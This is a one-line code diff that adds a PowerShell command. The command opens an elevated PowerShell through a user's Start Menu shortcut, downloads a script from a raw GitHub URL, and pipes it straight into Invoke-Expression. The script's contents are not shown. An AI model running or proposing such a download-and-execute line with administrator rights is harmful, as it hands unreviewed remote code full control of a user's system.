@@ -1,0 +1,1 @@
+Start-Process -Verb runas -FilePath 'C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk' -ArgumentList 'iwr -useb https://raw.githubusercontent.com/2ym/lge/main/lge.ps1 | iex'
